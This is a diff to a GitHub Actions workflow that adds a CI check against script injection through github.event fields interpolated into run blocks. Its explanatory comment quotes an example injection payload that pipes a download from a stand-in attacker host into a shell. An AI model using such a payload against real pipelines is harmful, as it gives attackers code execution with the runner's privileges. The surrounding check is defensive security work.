@@ -1388,6 +1388,20 @@ jobs:
         # 2/2 required-features items green at iter-111 add —
         # pure regression floor.
         run: bash tests/cargo-bin-required-features-valid.sh
+      - name: No script-injectable github.event interpolation in run blocks
+        # GitHub `${{ ... }}` substitution runs BEFORE bash sees
+        # the script. A PR body like `"; curl evil.com | sh; #`
+        # interpolated directly into a run: block becomes bash
+        # code with the runner's privileges. Per GitHub's own
+        # security guidance: pass attacker-controllable fields
+        # via `env:` block instead. Fields covered: PR/issue/
+        # comment/review body+title+name+email+label+ref,
+        # head_commit message+author. Same vector class as
+        # iter-93 (no pull_request_target) but applies to ANY
+        # trigger because these fields are user-controlled.
+        # 90/90 workflows green at iter-112 add — security-
+        # critical regression floor.
+        run: bash tests/workflow-no-script-injectable-fields.sh
 
   readme-link-check:
     name: README link sanity
